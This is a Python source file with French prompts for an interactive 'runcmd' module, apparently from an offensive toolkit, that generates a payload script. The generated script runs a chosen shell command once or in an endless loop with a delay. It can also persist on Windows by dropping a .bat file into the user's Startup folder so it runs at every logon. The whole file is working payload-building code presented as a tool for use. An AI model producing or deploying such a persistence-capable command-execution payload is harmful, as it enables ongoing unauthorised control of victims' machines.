import os
import time
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def affichage():
    clear()
    print(Fore.CYAN + "=== Configuration Run Command ===\n" + Style.RESET_ALL)
    print(f"""
          {Fore.YELLOW}Options :
{Fore.WHITE}
    1. Commande à exécuter
    2. Lancer au démarrage (Windows)
    3. Exécuter en boucle
    4. Délai entre les exécutions (en secondes)

{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
{Style.RESET_ALL}
    """)

def runcmd_module():
    clear()

    choix = {
        "Commande à exécuter": None,
        "Lancer au démarrage": False,
        "Exécuter en boucle": False,
        "Délai entre les exécutions": 0,
    }

    # -----------------------------------------------
    # Fonctions de configuration
    # -----------------------------------------------

    def commande_option():
        clear()
        commande = input("Entrez la commande à exécuter : ").strip()
        if commande == "":
            print(Fore.RED + "La commande ne peut pas être vide." + Style.RESET_ALL)
            time.sleep(1)
        else:
            choix["Commande à exécuter"] = commande
            print(f"Commande définie : {commande}")
            time.sleep(1)
        affichage()

    def demarrage_option():
        clear()
        reponse = input("Lancer au démarrage Windows ? (y/n) : ").strip().lower()
        if reponse == "y":
            choix["Lancer au démarrage"] = True
            print("Lancement au démarrage activé.")
        elif reponse == "n":
            choix["Lancer au démarrage"] = False
            print("Lancement au démarrage désactivé.")
        else:
            print(Fore.RED + "Répondez par 'y' ou 'n'." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def boucle_option():
        clear()
        reponse = input("Exécuter en boucle ? (y/n) : ").strip().lower()
        if reponse == "y":
            choix["Exécuter en boucle"] = True
            print("Exécution en boucle activée.")
        elif reponse == "n":
            choix["Exécuter en boucle"] = False
            print("Exécution en boucle désactivée.")
        else:
            print(Fore.RED + "Répondez par 'y' ou 'n'." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def delai_option():
        clear()
        delai = input("Délai entre les exécutions (en secondes, 0 = aucun) : ").strip()
        try:
            delai = int(delai)
            if delai < 0:
                raise ValueError
            choix["Délai entre les exécutions"] = delai
            print(f"Délai défini sur {delai} seconde(s).")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre entier positif." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    # -----------------------------------------------
    # Liste des options
    # -----------------------------------------------
    options = [
        ("Commande à exécuter",        commande_option),  # 1
        ("Lancer au démarrage",        demarrage_option), # 2
        ("Exécuter en boucle",         boucle_option),    # 3
        ("Délai entre les exécutions", delai_option),     # 4
    ]

    # -----------------------------------------------
    # Génération du payload
    # -----------------------------------------------
    def create_payload():

        if choix["Commande à exécuter"] is None:
            print(Fore.RED + "Erreur : définissez d'abord une commande (option 1)." + Style.RESET_ALL)
            input("\nAppuyez sur Entrée pour continuer...")
            return

        payload_dir  = os.path.join("Option", "modules", "payload", "payload_created")
        payload_path = os.path.join(payload_dir, "runcmd_payload.py")
        os.makedirs(payload_dir, exist_ok=True)

        with open(payload_path, "w", encoding="utf-8") as f:

            f.write("import os\n")
            f.write("import time\n")
            f.write("\n")

            f.write("# ============================================================\n")
            f.write("# Configuration générée automatiquement\n")
            f.write("# ============================================================\n")
            f.write(f"COMMANDE  = {repr(choix['Commande à exécuter'])}\n")
            f.write(f"DEMARRAGE = {choix['Lancer au démarrage']}\n")
            f.write(f"BOUCLE    = {choix['Exécuter en boucle']}\n")
            f.write(f"DELAI     = {choix['Délai entre les exécutions']}\n")
            f.write("\n")

            f.write("# ============================================================\n")
            f.write("# Démarrage automatique (Windows uniquement)\n")
            f.write("# ============================================================\n\n")

            f.write("def ajouter_demarrage():\n")
            f.write("    # Crée un fichier .bat dans le dossier Startup de Windows.\n")
            f.write("    # Ce dossier est exécuté automatiquement à chaque connexion.\n")
            f.write("    try:\n")
            f.write("        startup = os.path.join(\n")
            f.write("            os.getenv('APPDATA'),\n")
            f.write("            'Microsoft', 'Windows', 'Start Menu',\n")
            f.write("            'Programs', 'Startup', 'runcmd_payload.bat'\n")
            f.write("        )\n")
            f.write("        with open(startup, 'w') as bat:\n")
            f.write("            # __file__ = chemin absolu de ce script Python\n")
            f.write("            bat.write(f'python \"{os.path.abspath(__file__)}\"')\n")
            f.write("        print(f'Ajouté au démarrage : {startup}')\n")
            f.write("    except Exception as e:\n")
            f.write("        print(f'Erreur ajout démarrage : {e}')\n\n")

            f.write("# ============================================================\n")
            f.write("# Exécution de la commande\n")
            f.write("# ============================================================\n\n")

            f.write("def runcmd():\n\n")

            # Démarrage auto
            f.write("    if DEMARRAGE:\n")
            f.write("        ajouter_demarrage()\n\n")

            # Boucle ou exécution unique
            f.write("    if BOUCLE:\n")
            f.write("        # Tourne indéfiniment, Ctrl+C pour arrêter\n")
            f.write("        print('Exécution en boucle. Ctrl+C pour arrêter.')\n")
            f.write("        try:\n")
            f.write("            while True:\n")
            f.write("                os.system(COMMANDE)\n")
            f.write("                if DELAI > 0:\n")
            f.write("                    time.sleep(DELAI)\n")
            f.write("        except KeyboardInterrupt:\n")
            f.write("            print('\\nArrêt de la boucle.')\n")
            f.write("    else:\n")
            f.write("        # Exécution unique\n")
            f.write("        os.system(COMMANDE)\n\n")

            f.write("if __name__ == '__main__':\n")
            f.write("    runcmd()\n")

        print(Fore.GREEN + f"Payload généré dans {payload_path}" + Style.RESET_ALL)
        input("\nAppuyez sur Entrée pour continuer...")

    # -----------------------------------------------
    # Boucle principale
    # -----------------------------------------------
    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL).strip()

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
                    time.sleep(1)
            except (ValueError, IndexError):
                print(Fore.RED + "Veuillez saisir 'set <num>'" + Style.RESET_ALL)
                time.sleep(1)

        elif cmd.lower() == "show":
            clear()
            print(Fore.CYAN + "\nConfiguration actuelle :\n" + Style.RESET_ALL)
            for option, value in choix.items():
                couleur = Fore.GREEN if value not in (None, False, 0) else Fore.RED
                print(f"  {option:35s} : {couleur}{value}{Style.RESET_ALL}")
            input("\nAppuyez sur Entrée pour continuer...")

        elif cmd.lower() == "create":
            create_payload()

        else:
            print(Fore.RED + "Commande inconnue." + Style.RESET_ALL)
            time.sleep(1)

